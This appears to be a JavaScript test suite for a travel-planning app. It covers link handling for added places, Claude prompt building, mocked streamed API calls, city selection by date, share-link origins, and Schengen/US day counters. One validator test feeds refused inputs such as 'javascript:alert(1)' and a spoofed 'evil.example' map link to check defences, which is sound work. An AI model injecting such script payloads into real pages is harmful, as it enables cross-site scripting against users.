  assert.equal(ahead.auto, false);
  const emptyPast = pm.days.filter(d => d.iso === '2026-08-09')[0];
  assert.equal(emptyPast.items.length, 0);
  assert.equal(emptyPast.auto, false);
  // And the lookup the two reveal paths use agrees with the model.
  assert.equal(C.planDayAutoFor(data, st, '2026-08-10'), true);
  assert.equal(C.planDayAutoFor(data, st, '2026-08-13'), false);
  assert.equal(C.planDayAutoFor(data, st, '2999-01-01'), false);
});

// ==========================================================================
// Add a place: the research link (item 5)
// ==========================================================================

test('a map link lands as a map link and a website as a website', () => {
  const map = C.newPlaceDelta(GOOD, {
    name: 'Pizzarté', section: 'dinner',
    link: 'https://maps.app.goo.gl/abc123'
  });
  assert.deepEqual(map.errors, []);
  assert.deepEqual(map.delta.items[0].links,
    [{ kind: 'map', label: 'Map', href: 'https://maps.app.goo.gl/abc123' }]);
  const web = C.newPlaceDelta(GOOD, {
    name: 'Pizzarté', section: 'dinner', link: 'https://pizzarte.al/menu'
  });
  assert.equal(web.delta.items[0].links[0].kind, 'web');
  assert.equal(web.delta.items[0].links[0].label, 'Website');
  // google.com is only a map on its map paths; anywhere else it is a website.
  const g = C.newPlaceDelta(GOOD, { name: 'X', section: 'dinner', link: 'https://www.google.com/maps/place/Pizzart%C3%A9' });
  assert.equal(g.delta.items[0].links[0].kind, 'map');
  const g2 = C.newPlaceDelta(GOOD, { name: 'Y', section: 'dinner', link: 'https://www.google.com/search?q=pizzarte' });
  assert.equal(g2.delta.items[0].links[0].kind, 'web');
  // A host that merely MENTIONS a map host in its query is not a map link.
  const fake = C.newPlaceDelta(GOOD, { name: 'Z', section: 'dinner', link: 'https://evil.example/?x=google.com/maps' });
  assert.equal(fake.delta.items[0].links[0].kind, 'web');
});

test('the link field is optional, and refuses what a browser could not open', () => {
  const none = C.newPlaceDelta(GOOD, { name: 'Pizzarté', section: 'dinner' });
  assert.deepEqual(none.errors, []);
  assert.deepEqual(none.delta.items[0].links, []);
  assert.deepEqual(C.newPlaceDelta(GOOD, { name: 'A', section: 'dinner', link: '   ' }).delta.items[0].links, []);
  // A bare word is a relative URL, which safeHref would happily accept and
  // which would resolve against this app's own origin. Not a research link.
  ['pizzarte', 'javascript:alert(1)', 'tel:+15551234567', 'ftp://x.example/a'].forEach(bad => {
    const r = C.newPlaceDelta(GOOD, { name: 'A', section: 'dinner', link: bad });
    assert.equal(r.delta, null, bad + ' should be refused');
    assert.ok(/http/.test(r.errors.join(' ')), bad + ' should say what is wanted');
  });
});

test('diacritics survive the id, the name and the prompt', () => {
  // The place that prompted this whole item. Its accent must not break the id
  // slug, and it must reach Claude spelled the way Rob typed it.
  const built = C.newPlaceDelta(GOOD, {
    name: 'Pizzarté', section: 'dinner', note: 'Recommended at dinner',
    link: 'https://maps.app.goo.gl/pizzarte'
  });
  assert.deepEqual(built.errors, []);
  // slug() DROPS a diacritic rather than transliterating it, so the id is
  // "pizzart". That is fine and it is what every other id in this app already
  // does (Tirane's own guide is filed under "tiran-"), but it is pinned here
  // so a future slug change cannot silently re-file every existing city.
  assert.equal(built.id, 'pizzart');
  assert.equal(built.id.indexOf(' '), -1);
  const merged = C.mergeDelta(clone(GOOD), built.delta);
  assert.deepEqual(merged.errors, []);
  const item = merged.data.items.filter(i => i.id === built.id)[0];
  assert.equal(item.name, 'Pizzarté');
  const tpl = require('fs').readFileSync(
    require('path').join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const prompt = C.promptKit.buildPlacePassPrompt(tpl, merged.data, item, C.emptyState());
  assert.ok(prompt.indexOf('Pizzarté') !== -1, 'the name reaches the prompt intact');
  assert.ok(prompt.indexOf('https://maps.app.goo.gl/pizzarte') !== -1, 'the link reaches the prompt');
  assert.ok(/user provided this link/i.test(prompt), 'and is named as a research hint');
  assert.ok(prompt.indexOf('- **Item id:** ' + built.id) !== -1);
});

test('a place with no link says nothing about links in its prompt', () => {
  const built = C.newPlaceDelta(GOOD, { name: 'Somewhere', section: 'dinner' });
  const merged = C.mergeDelta(clone(GOOD), built.delta);
  const item = merged.data.items.filter(i => i.id === built.id)[0];
  const tpl = require('fs').readFileSync(
    require('path').join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const prompt = C.promptKit.buildPlacePassPrompt(tpl, merged.data, item, C.emptyState());
  assert.equal(/user provided this link/i.test(prompt), false);
});

test('an item that already carried links offers them to the research pass', () => {
  // Brasserie 1900 arrived from a generated guide with a map link on it. A
  // re-run of the place pass should hand that link over too.
  const tpl = require('fs').readFileSync(
    require('path').join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const item = GOOD.items.filter(i => i.id === 'brasserie')[0];
  const prompt = C.promptKit.buildPlacePassPrompt(tpl, GOOD, item, C.emptyState());
  assert.ok(prompt.indexOf('https://maps.google.com/?cid=895365817124148954') !== -1);
});

let asyncPending = 0;
function asyncTest(name, fn) {
  asyncPending++;
  fn().then(() => { pass++; console.log('PASS ' + name); },
    (e) => { fail++; console.log('FAIL ' + name + '\n  ' + (e && e.message)); })
    .then(() => { asyncPending--; });
}

asyncTest('callClaudeStream turns a streamed reply into the delta the Apply path merges', () => {
  const delta = {
    schema: 1, delta: true,
    ratings: { 'oda-garden': { stars: 4.6, count: 812 } },
    intel: { 'oda-garden': { tips: ['Ranks 2nd of your 4 dinner picks.'] } }
  };
  const answer = 'Checked it.\n\n```json\n' + JSON.stringify(delta) + '\n```';
  let seenRequest = null;
  const events = [
    { type: 'content_block_delta', delta: { type: 'thinking_delta', thinking: 'weighing it up' } }
  ].concat(answer.match(/[\s\S]{1,20}/g).map((chunk) => (
    { type: 'content_block_delta', delta: { type: 'text_delta', text: chunk } }
  )));
  const call = loadCallClaudeStream((url, opts) => {
    seenRequest = { url: url, opts: opts };
    return Promise.resolve({ ok: true, body: sseBody(events) });
  });
  const progress = [];
  return call('THE PROMPT', 'sk-test-not-a-real-key', (p) => progress.push(p)).then((text) => {
    // The request itself: the browser-direct header and the key, and the
    // prompt the engine built, verbatim.
    assert.equal(seenRequest.url, 'https://api.anthropic.com/v1/messages');
    assert.equal(seenRequest.opts.headers['x-api-key'], 'sk-test-not-a-real-key');
    assert.equal(seenRequest.opts.headers['anthropic-dangerous-direct-browser-access'], 'true');
    assert.equal(JSON.parse(seenRequest.opts.body).messages[0].content, 'THE PROMPT');
    // Thinking never contributes to the text the caller parses.
    assert.equal(text, answer);
    assert.ok(progress.filter((p) => p.kind === 'thinking').length >= 1);
    assert.ok(progress.filter((p) => p.kind === 'text').length >= 2);
    // And the parse-and-merge the app does next really works on it.
    const block = C.extractJsonBlock(text);
    const built = C.newPlaceDelta(RIVALS, { name: 'Oda Garden', section: 'dinner' });
    const city = C.mergeDelta(RIVALS, built.delta).data;
    const res = C.mergeDelta(city, JSON.parse(block));
    assert.deepEqual(res.errors, []);
    assert.equal(res.summary.ratingsApplied, 1);
    assert.equal(res.data.items.filter((i) => i.id === 'oda-garden')[0].rating.stars, 4.6);
  });
});

asyncTest('a Claude API error surfaces as a message the modal can show as-is', () => {
  const call = loadCallClaudeStream(() => Promise.resolve({
    ok: false, status: 401,
    text: () => Promise.resolve(JSON.stringify({ error: { message: 'invalid x-api-key' } }))
  }));
  return call('p', 'bad-key', null).then(
    () => { throw new Error('expected a rejection'); },
    (e) => {
      assert.ok(/401/.test(e.message), e.message);
      assert.ok(/invalid x-api-key/.test(e.message), e.message);
    });
});

asyncTest('a reply with no JSON fence is reported, never half applied', () => {
  const events = 'I could not find that place anywhere.'.match(/[\s\S]{1,9}/g)
    .map((t) => ({ type: 'content_block_delta', delta: { type: 'text_delta', text: t } }));
  const call = loadCallClaudeStream(() => Promise.resolve({ ok: true, body: sseBody(events) }));
  return call('p', 'k', null).then((text) => {
    assert.equal(text, 'I could not find that place anywhere.');
    assert.equal(C.extractJsonBlock(text), null);
    assert.ok(/single ```json code block/.test(C.RETRY_INSTRUCTION));
  });
});

// Boot lands on the city the calendar says he is in (owner ask 2026-08-28).
// Rows are {id, from, to, archived}: the caller resolves the dates and the
// Past flag, pickCurrentCity only decides between them.
const STAYS = [
  { id: 'batumi', from: '2026-08-08', to: '2026-08-15', archived: false },
  { id: 'yerevan', from: '2026-08-18', to: '2026-08-24', archived: false },
  { id: 'tirana', from: '2026-08-24', to: '2026-08-29', archived: false },
  { id: 'ksamil', from: '2026-08-29', to: '2026-09-04', archived: false }
];

test('mid-stay boots the city whose dates contain today', () => {
  assert.equal(C.appStore.pickCurrentCity(STAYS, '2026-08-26'), 'tirana');
  assert.equal(C.appStore.pickCurrentCity(STAYS, '2026-08-11'), 'batumi');
});

test('a travel day picks the arrival city, not the one being left', () => {
  // Tirana runs to the 29th and Ksamil starts on the 29th, so both contain
  // today. The later `from` wins: arrival beats departure.
  assert.equal(C.appStore.pickCurrentCity(STAYS, '2026-08-29'), 'ksamil');
  // And the same tie read from the other order, so it is the dates deciding
  // and not the position in the list.
  assert.equal(C.appStore.pickCurrentCity(STAYS.slice().reverse(), '2026-08-29'), 'ksamil');
});

test('a gap between stays boots the next city ahead', () => {
  // The 16th is after Batumi and before Yerevan: nothing contains today, so
  // the smallest `from` still in the future takes it.
  assert.equal(C.appStore.pickCurrentCity(STAYS, '2026-08-16'), 'yerevan');
  // Before every stay begins, it is still the earliest one ahead.
  assert.equal(C.appStore.pickCurrentCity(STAYS, '2026-07-01'), 'batumi');
});

test('when every stay is behind him there is no calendar answer', () => {
  assert.equal(C.appStore.pickCurrentCity(STAYS, '2026-10-01'), null);
  assert.equal(C.appStore.pickCurrentCity([], '2026-08-26'), null);
});

test('an archived city is skipped even when its dates contain today', () => {
  const withArchived = STAYS.map((s) =>
    s.id === 'tirana' ? Object.assign({}, s, { archived: true }) : s);
  // The 26th is inside Tirana and inside nothing else, so skipping it has to
  // fall through to the next city ahead rather than return Tirana anyway.
  assert.equal(C.appStore.pickCurrentCity(withArchived, '2026-08-26'), 'ksamil');
  // Archiving the arrival city on a travel day hands the day back to the
  // city he is leaving, which still contains today.
  const noKsamil = STAYS.map((s) =>
    s.id === 'ksamil' ? Object.assign({}, s, { archived: true }) : s);
  assert.equal(C.appStore.pickCurrentCity(noKsamil, '2026-08-29'), 'tirana');
});

test('rows with junk dates are ignored, never picked', () => {
  const junk = [
    { id: 'nodates', from: null, to: null, archived: false },
    { id: 'backwards', from: '2026-08-30', to: '2026-08-20', archived: false },
    { id: '', from: '2026-08-25', to: '2026-08-27', archived: false },
    null,
    { id: 'good', from: '2026-08-25', to: '2026-08-27', archived: false }
  ];
  assert.equal(C.appStore.pickCurrentCity(junk, '2026-08-26'), 'good');
  assert.equal(C.appStore.pickCurrentCity(null, '2026-08-26'), null);
});

test('an Edit-dates stayOverride is the range the boot pick reads', () => {
  // The app shell feeds pickCurrentCity through effectiveDates, so a stay the
  // traveler moved by hand has to move the boot with it. GOOD ships
  // 2026-08-08..2026-08-15; the override pushes it over today.
  const shipped = C.effectiveDates(clone(GOOD), C.emptyState());
  assert.deepEqual(shipped, { from: '2026-08-08', to: '2026-08-15' });
  const moved = C.emptyState();
  moved.stayOverride = { from: '2026-08-25', to: '2026-08-27' };
  const eff = C.effectiveDates(clone(GOOD), moved);
  assert.deepEqual(eff, { from: '2026-08-25', to: '2026-08-27' });
  const row = { id: 'batumi', from: eff.from, to: eff.to, archived: false };
  assert.equal(C.appStore.pickCurrentCity([row], '2026-08-26'), 'batumi');
  // Without the override the same day falls outside and there is no answer.
  assert.equal(C.appStore.pickCurrentCity(
    [{ id: 'batumi', from: shipped.from, to: shipped.to, archived: false }],
    '2026-08-26'), null);
});

test('an explicit #city= hash always beats the calendar pick', () => {
  const store = C.appStore.normalize({
    cities: {
      tirana: { city: { name: 'Tirana', dates: { from: '2026-08-24', to: '2026-08-29' } } },
      ksamil: { city: { name: 'Ksamil', dates: { from: '2026-08-29', to: '2026-09-04' } } },
      batumi: { city: { name: 'Batumi', dates: { from: '2026-08-08', to: '2026-08-15' } } }
    },
    order: ['batumi', 'tirana', 'ksamil'],
    active: 'batumi'
  });
  // A deep link is an explicit request and outranks everything.
  assert.equal(C.appStore.resolveStartCity(store, 'tirana', 'ksamil'), 'tirana');
  // A plain load takes the calendar's answer over the stale active city.
  assert.equal(C.appStore.resolveStartCity(store, null, 'ksamil'), 'ksamil');
  // A hash naming a city this device no longer holds is a dead link, so it
  // falls through to the calendar rather than to whatever was last open.
  assert.equal(C.appStore.resolveStartCity(store, 'gone', 'ksamil'), 'ksamil');
  // No calendar answer keeps the old behaviour exactly: stored active, then
  // the first city in order.
  assert.equal(C.appStore.resolveStartCity(store, null, null), 'batumi');
  assert.equal(C.appStore.resolveStartCity(store, null), 'batumi');
  // An auto id for a city that is not in the store is ignored, not returned.
  assert.equal(C.appStore.resolveStartCity(store, null, 'nowhere'), 'batumi');
});


// ==================== HOST INDEPENDENCE ====================
// Added with the 2026-09-01 move from cityops.robriggs.com to app.nomadding.com.
//
// That move cost a sweep of eleven files and it broke a share link that had
// already been sent, because the app's own hostname was written into shipped
// bytes in four places. These tests exist so the NEXT move is a DNS change and
// a one-line CNAME, and so a hardcoded host cannot creep back in unnoticed.

// The pure rule, on its own. This is what stops a share link being built on an
// address only the machine that made it can open.
test('publicOrigin keeps a real https origin', () => {
  const FB = 'https://app.nomadding.com';
  assert.equal(C.shareKit.publicOrigin('https://app.nomadding.com', FB), 'https://app.nomadding.com');
  assert.equal(C.shareKit.publicOrigin('https://preview.example.dev', FB), 'https://preview.example.dev');
  // A port is part of a perfectly real public origin.
  assert.equal(C.shareKit.publicOrigin('https://example.com:8443', FB), 'https://example.com:8443');
});

test('publicOrigin falls back to anything family could not open', () => {
  const FB = 'https://app.nomadding.com';
  // No TLS: a link family taps is a link over the open internet.
  assert.equal(C.shareKit.publicOrigin('http://app.nomadding.com', FB), FB);
  // The local lives: dev server, loopback, and a downloaded file.
  assert.equal(C.shareKit.publicOrigin('http://localhost:8080', FB), FB);
  assert.equal(C.shareKit.publicOrigin('https://localhost:8443', FB), FB);
  assert.equal(C.shareKit.publicOrigin('https://app.localhost', FB), FB);
  assert.equal(C.shareKit.publicOrigin('https://127.0.0.1:4000', FB), FB);
  assert.equal(C.shareKit.publicOrigin('https://[::1]:4000', FB), FB);
  assert.equal(C.shareKit.publicOrigin('file://', FB), FB);
  // "null" is the literal string a browser hands back for a file:// origin.
  assert.equal(C.shareKit.publicOrigin('null', FB), FB);
  assert.equal(C.shareKit.publicOrigin('', FB), FB);
  assert.equal(C.shareKit.publicOrigin(undefined, FB), FB);
  // An origin is a scheme and a host, nothing more. Anything carrying a path,
  // a query or a fragment is not one and is not trusted to be one.
  assert.equal(C.shareKit.publicOrigin('https://app.nomadding.com/trip/', FB), FB);
  assert.equal(C.shareKit.publicOrigin('https://app.nomadding.com?x=1', FB), FB);
});

test('publicOrigin composes into a share URL family can open', () => {
  const FB = 'https://app.nomadding.com';
  const tok = 'a'.repeat(32);
  assert.equal(C.shareKit.url(C.shareKit.publicOrigin('https://app.nomadding.com', FB), tok),
    'https://app.nomadding.com/share/#' + tok);
  // Published from a laptop dev copy, the link is still the canonical one.
  assert.equal(C.shareKit.url(C.shareKit.publicOrigin('http://localhost:8899', FB), tok),
    'https://app.nomadding.com/share/#' + tok);
});

// The bytes that actually ship. Reading the built files rather than src/ is the
// point: the drift guard proves built matches src, and these prove the built
// output carries no retired address.
const hostFs = require('node:fs');
const hostPath = require('node:path');
const hostRoot = hostPath.join(__dirname, '..');
function shipped(rel) {
  return hostFs.readFileSync(hostPath.join(hostRoot, rel), 'utf8');
}
const SHIPPED_SURFACES = [
  'index.html', 'trip/index.html', 'share/index.html', 'example.html',
  'template.html', 'trip.html', 'sw.js', 'CNAME', 'README.md',
  'schema/cityops.schema.json'
];

test('no shipped surface names the retired host', () => {
  const RETIRED = 'cityops' + '.robriggs.com';  // split so this line is not itself a hit
  SHIPPED_SURFACES.forEach(function (rel) {
    assert.equal(shipped(rel).indexOf(RETIRED), -1,
      rel + ' still names ' + RETIRED + '; the app moved on 2026-09-01');
  });
});

test('the share link family holds is derived from the served origin', () => {
  const trip = shipped('trip/index.html');
  // The assignment itself, not just the absence of the old host: a future edit
  // that pins SHARE_ORIGIN back to a literal has to fail here.
  assert.ok(/const SHARE_ORIGIN = CityOps\.shareKit\.publicOrigin\(location\.origin,/.test(trip),
    'trip surface no longer derives SHARE_ORIGIN from location.origin');
  // And the builder still goes through it, so deriving it is not decorative.
  assert.ok(/CityOps\.shareKit\.url\(SHARE_ORIGIN, token\)/.test(trip),
    'trip surface no longer builds the share link from SHARE_ORIGIN');
});

test('the share page points its doors at the host that served it', () => {
  const share = shipped('share/index.html');
  assert.ok(/const CITYOPS_BASE = \/\^https\?/.test(share),
    'share page no longer derives CITYOPS_BASE from location.origin');
  // The fallback is allowed to be a literal, and is the only one allowed.
  const hits = share.match(/https:\/\/app\.nomadding\.com/g) || [];
  assert.ok(hits.length <= 3,
    'share page carries ' + hits.length + ' hardcoded app hosts; expected the ' +
    'fallback constant plus the two no-JS door hrefs');
});

test('the service worker precaches paths, never hosts', () => {
  const sw = shipped('sw.js');
  const shell = sw.match(/var SHELL = \[([^\]]*)\]/);
  assert.ok(shell, 'sw.js no longer declares a SHELL list');
  // Root-absolute paths only. An absolute URL in here would pin the cache to
  // one hostname and quietly stop precaching the day the app moves.
  shell[1].split(',').map(function (s) { return s.trim().replace(/^'|'$/g, ''); })
    .filter(Boolean).forEach(function (p) {
      assert.ok(p.charAt(0) === '/' && p.indexOf('//') === -1,
        'sw.js precaches ' + p + ', which is not a root-absolute path');
    });
});

// ---- the compliance counters ----
//
// These are the numbers Rob makes visa and tax decisions on, and all three of
// the corrections below moved them in the direction that had been telling him
// he had more room than he had. Each test names the wrong answer the old code
// gave, so a regression reads as a regression and not as a puzzle.

const DK = C.dayKit;

test('Schengen counts DAYS, so arrival and departure day both count', () => {
  // One stop, Mar 1 to Mar 10. Ten calendar dates are touched: the 1st through
  // the 10th. The old code counted nights, [checkIn, checkOut - 1], and said 9.
  const one = [{ country: 'France', checkIn: '2026-03-01', checkOut: '2026-03-10' }];
  assert.equal(DK.schengenUsedAt(one, '2026-03-10'), 10);
  // A same-day in and out is one day of presence, not zero. This is the case
  // the nights model got worst: a day trip into the zone counted as nothing.
  assert.equal(DK.schengenUsedAt(
    [{ country: 'France', checkIn: '2026-03-01', checkOut: '2026-03-01' }], '2026-03-01'), 1);
  // Back to back stops, where the departure date of one IS the arrival date of
  // the next, are the ordinary shape of a European leg. Mar 1 to Mar 20 is 20
  // dates however it is split, and the handover day is ONE day.
  const legs = [
    { country: 'Portugal', checkIn: '2026-03-01', checkOut: '2026-03-10' },
    { country: 'Spain', checkIn: '2026-03-10', checkOut: '2026-03-20' }
  ];
  assert.equal(DK.schengenUsedAt(legs, '2026-03-20'), 20);
});

test('overlapping stays are one day of presence, never two', () => {
  // Two stays booked over the same week, which is what an itinerary looks like
  // while the traveler is still deciding. The old code summed each stay's
  // overlap separately and double counted every shared date.
  const overlapping = [
    { country: 'Italy', checkIn: '2026-04-01', checkOut: '2026-04-10' },
    { country: 'Italy', checkIn: '2026-04-05', checkOut: '2026-04-15' }
  ];
  // Apr 1 through Apr 15 is 15 dates. Summed per stay it would be 10 + 11 = 21.
  assert.equal(DK.schengenUsedAt(overlapping, '2026-04-15'), 15);
  // Different countries in the same zone, same overlap: still one day each.
  const twoCountries = [
    { country: 'Italy', checkIn: '2026-04-01', checkOut: '2026-04-10' },
    { country: 'Austria', checkIn: '2026-04-08', checkOut: '2026-04-12' }
  ];
  assert.equal(DK.schengenUsedAt(twoCountries, '2026-04-12'), 12);
  // One stay fully inside another contributes nothing extra at all.
  const nested = [
    { country: 'Italy', checkIn: '2026-04-01', checkOut: '2026-04-30' },
    { country: 'Italy', checkIn: '2026-04-10', checkOut: '2026-04-12' }
  ];
  assert.equal(DK.schengenUsedAt(nested, '2026-04-30'), 30);
});

test('the Schengen window is exactly 180 days, reference date included', () => {
  const stay = [{ country: 'Germany', checkIn: '2026-01-01', checkOut: '2026-01-01' }];
  // The window ending on refISO reaches back 179 days, so day 180 is the last
  // one that still counts and day 181 has fallen out.
  assert.equal(DK.SCHENGEN_WINDOW_DAYS, 180);
  assert.equal(DK.schengenUsedAt(stay, '2026-06-29'), 1);   // day 180
  assert.equal(DK.schengenUsedAt(stay, '2026-06-30'), 0);   // day 181
  // An eliminated stop is not presence, and a stop missing an end has no
  // dates to count.
  assert.equal(DK.schengenUsedAt(
    [{ country: 'Germany', checkIn: '2026-01-01', checkOut: '2026-01-10', status: 'eliminated' }],
    '2026-01-10'), 0);
  assert.equal(DK.schengenUsedAt([{ country: 'Germany', checkIn: '2026-01-01' }], '2026-01-10'), 0);
});

test('the Schengen peak is the worst point ahead, not the count today', () => {
  const plan = [
    { country: 'France', checkIn: '2026-03-01', checkOut: '2026-03-20' },
    { country: 'Spain', checkIn: '2026-05-01', checkOut: '2026-05-20' }
  ];
  const peak = DK.schengenPeak(plan);
  // Both stops sit inside one 180-day window, so the peak is the sum, on the
  // last day of the later stop.
  assert.equal(peak.days, 40);
  assert.equal(peak.date, '2026-05-20');
  assert.deepEqual(DK.schengenPeak([]), { days: 0, date: null });
});

test('Schengen membership tolerates case, padding and the usual alternate names', () => {
  // The country field is free text and also arrives from imported JSON, so
  // exact string equality was scoring real Schengen stays as zero in silence.
  ['France', '  france  ', 'FRANCE', 'France\n'].forEach(function (n) {
    assert.ok(DK.isSchengen(n), JSON.stringify(n) + ' should be Schengen');
  });
  assert.ok(DK.isSchengen('Czechia'), 'Czechia is the Czech Republic');
  assert.ok(DK.isSchengen('The Netherlands'));
  assert.ok(DK.isSchengen('Holland'));
  assert.ok(DK.isSchengen('Schweiz'));
  // The 29-name array is still the authority and still has 29 names in it.
  assert.equal(DK.SCHENGEN_MEMBERS.length, 29);
  // Non-members stay non-members. Ireland and Cyprus are the two that get
  // assumed into the zone most often and are in neither.
  ['Ireland', 'Cyprus', 'United Kingdom', 'Georgia', 'Turkey', 'Australia']
    .forEach(function (n) { assert.ok(!DK.isSchengen(n), n + ' is not Schengen'); });
});

test('a country name one typo from a member is reported, and real countries are not', () => {
  // The dangerous name is the one that contributes ZERO Schengen days in
  // silence: the counter then reads compliant when it is not.
  assert.equal(DK.nearMiss('Portgual'), 'Portugal');
  assert.equal(DK.nearMiss('Belguim'), 'Belgium');
  assert.equal(DK.nearMiss('Netherland'), 'Netherlands');
  // Ireland/Iceland and Australia/Austria are the two pairs that would make
  // this feature cry wolf on ordinary destinations. Neither may fire.
  assert.equal(DK.nearMiss('Ireland'), null);
  assert.equal(DK.nearMiss('Australia'), null);
  assert.equal(DK.nearMiss('Georgia'), null);
  assert.equal(DK.nearMiss('Thailand'), null);
  // A member is not a near miss of itself.
  assert.equal(DK.nearMiss('France'), null);
  assert.equal(DK.nearMiss('  spain '), null);
  // The itinerary-level report names each bad country once, with the member it
  // probably meant, and says nothing at all when the data is clean.
  assert.deepEqual(DK.suspects([
    { country: 'Portgual', checkIn: '2026-07-20', checkOut: '2026-08-02' },
    { country: 'Portgual', checkIn: '2026-09-01', checkOut: '2026-09-05' },
    { country: 'Greece', checkIn: '2026-07-01', checkOut: '2026-07-20' }
  ]), [{ name: 'Portgual', meant: 'Portugal' }]);
  assert.deepEqual(DK.suspects([{ country: 'Greece', checkIn: '2026-07-01', checkOut: '2026-07-20' }]), []);
});

test('US days are a true rolling 12 months, 365 days ending today', () => {
  assert.equal(DK.US_WINDOW_DAYS, 365);
  assert.equal(DK.FEIE_US_DAY_LIMIT, 35);
  const stay = [{ country: 'United States', state: 'TX', checkIn: '2025-09-02', checkOut: '2025-09-02' }];
  // The window is todayISO minus 364 through todayISO inclusive, which is
  // exactly 365 dates. On 2026-09-01 the oldest date still inside it is
  // 2025-09-02; one day earlier has fallen out.
  assert.equal(DK.usDaysRolling(stay, '2026-09-01').total, 1);
  assert.equal(DK.usDaysRolling(stay, '2026-09-02').total, 0);
  // And the window really is 365 long, not 364 or 366: a stay spanning the
  // whole of it counts every date in it and nothing outside.
  const wide = [{ country: 'United States', state: 'TX', checkIn: '2020-01-01', checkOut: '2030-01-01' }];
  assert.equal(DK.usDaysRolling(wide, '2026-09-01').total, 365);
  // A stop entirely in the future is not presence yet. This is the correction
  // that mattered most: the old counter summed the whole itinerary, so a trip
  // booked for next month already counted against this year's 35.
  const future = [{ country: 'United States', state: 'TN', checkIn: '2026-09-20', checkOut: '2026-09-27' }];
  assert.equal(DK.usDaysRolling(future, '2026-09-01').total, 0);
});

test('a US stop with no state is counted, and says so', () => {
  // It used to be skipped outright, so those days vanished from a number the
  // traveler files taxes against. They are counted now and attributed to a
  // named bucket, so the gap is visible instead of silent.
  const stops = [
    { country: 'United States', state: 'FL', checkIn: '2026-08-01', checkOut: '2026-08-05' },
    { country: 'United States', state: '', checkIn: '2026-08-10', checkOut: '2026-08-14' },
    { country: 'USA', checkIn: '2026-08-20', checkOut: '2026-08-22' }
  ];
  const out = DK.usDaysRolling(stops, '2026-09-01');
  assert.equal(out.total, 5 + 5 + 3);
  assert.equal(out.byState.FL, 5);
  assert.equal(out.byState[DK.NO_STATE_LABEL], 8);
  assert.equal(DK.NO_STATE_LABEL, 'State not set');
  // Whitespace in a state is not a third state.
  const padded = [{ country: 'United States', state: ' FL ', checkIn: '2026-08-01', checkOut: '2026-08-02' }];
  assert.equal(DK.usDaysRolling(padded, '2026-09-01').byState.FL, 2);
  // The US is the US however it is spelled.
  ['United States', 'USA', 'US', 'united states of america'].forEach(function (n) {
    assert.ok(DK.isUS(n), n + ' should be the US');
  });
  assert.ok(!DK.isUS('Georgia'), 'the country Georgia is not the US');
});

test('the budget variance has three branches and the middle one can fire', () => {
  // The old pair of conditions were exact complements ("more than 5% over" and
  // "at or under 5% over"), so the amber middle was unreachable and everything
  // from dead-on to 5% OVER target printed "Under target by" a NEGATIVE amount.
  assert.equal(DK.BUDGET_BAND, 0.05);
  assert.equal(DK.budgetVariance(3200, 3000).kind, 'over');
  assert.equal(DK.budgetVariance(2800, 3000).kind, 'under');
  // The band itself, and both of its edges, are "on target". These four are
  // the cases that used to read "Under target by $0/mo" or worse.
  [3000, 3001, 3100, 3150, 2850, 2999].forEach(function (avg) {
    assert.equal(DK.budgetVariance(avg, 3000).kind, 'on', 'avg ' + avg);
  });
  // Just outside the band on each side flips, so the branches partition.
  assert.equal(DK.budgetVariance(3150.01, 3000).kind, 'over');
  assert.equal(DK.budgetVariance(2849.99, 3000).kind, 'under');
  // A positive delta must never be described with a negative "under" amount.
  const on = DK.budgetVariance(3100, 3000);
  assert.ok(on.delta > 0 && on.kind === 'on');
  // No target means no variance line at all, not a divide by zero.
  assert.equal(DK.budgetVariance(3000, 0), null);
  assert.equal(DK.budgetVariance(3000, null), null);
});

test('days by country counts days, dedupes, and scopes to the range it is given', () => {
  const stops = [
    { country: 'Portugal', checkIn: '2026-03-01', checkOut: '2026-03-10' },
    { country: 'Spain', checkIn: '2026-03-10', checkOut: '2026-03-20' }
  ];
  // The handover date is claimed by the first stay that reaches it, so the two
  // countries add up to the 20 real dates rather than 21.
  const all = DK.countryDays(stops, '1900-01-01', '2099-12-31');
  assert.equal(all.Portugal + all.Spain, 20);
  assert.equal(all.Portugal, 10);
  // Unlike the two compliance counters, this one IS a view and the caller's
  // range really does scope it.
  const march = DK.countryDays(stops, '2026-03-05', '2026-03-12');
  assert.equal(march.Portugal, 6);   // the 5th through the 10th
  assert.equal(march.Spain, 2);      // the 11th and the 12th
});

test('a corrupt stay cannot hang the counters', () => {
  // A checkOut before its checkIn is not presence, and a wild one must not
  // spin the date walk forever.
  assert.equal(DK.schengenUsedAt(
    [{ country: 'France', checkIn: '2026-03-10', checkOut: '2026-03-01' }], '2026-03-20'), 0);
  const wild = [{ country: 'France', checkIn: '2026-01-01', checkOut: '2999-01-01' }];
  assert.equal(DK.schengenUsedAt(wild, '2026-06-01'), 152);
  assert.deepEqual(DK.schengenUsedAt([], '2026-06-01'), 0);
  assert.deepEqual(DK.usDaysRolling([], '2026-06-01'), { total: 0, byState: {} });
  assert.equal(DK.schengenUsedAt([{ country: 'France', checkIn: '2026-01-01', checkOut: '2026-01-05' }], ''), 0);
});

test('the trip surface reads the counters from the engine, not its own copy', () => {
  // The arithmetic moved into CityOps.dayKit so it could be tested at all. If
  // the trip shell grows a second implementation, these numbers drift apart in
  // exactly the way that is impossible to notice from the UI.
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'src', 'trip-shell.html'), 'utf8');
  assert.ok(trip.indexOf('CityOps.dayKit.schengenUsedAt') !== -1);
  assert.ok(trip.indexOf('CityOps.dayKit.usDaysRolling') !== -1);
  assert.ok(trip.indexOf('CityOps.dayKit.budgetVariance') !== -1);
  // The nights-based presence model, and the label that described it, are gone.
  assert.equal(trip.indexOf('lastNightDate'), -1, 'the nights model came back');
  assert.equal(trip.indexOf('planned nights total'), -1);
  // The two compliance counters are NOT scoped by the map filter. The filtered
  // label belongs to the cost and country sections only, so it must appear
  // exactly twice.
  assert.equal(trip.split('${filterLabel}').length - 1, 2,
    'a compliance counter picked up the map filter label');
});

test('the trip surface leaves no control that cannot succeed', () => {
  const fs = require('fs');
  const path = require('path');
  const trip = fs.readFileSync(path.join(__dirname, '..', 'src', 'trip-shell.html'), 'utf8');
  // The AI modal read #modal-response, which is not in the markup, so every
  // "Assess with AI" button threw before the modal could open.
  assert.ok(trip.indexOf('id="modal-result"') !== -1);
  // A plain absence check, which is only possible because the comments
  // explaining each of these removals carry the DATE and not the string. That
  // is the repo's own rule, learned when the retired-host test tripped over its
  // own explanation; keep it when editing the comments below these lines.
  assert.equal(trip.indexOf('modal-response'), -1, 'the wrong modal id came back');
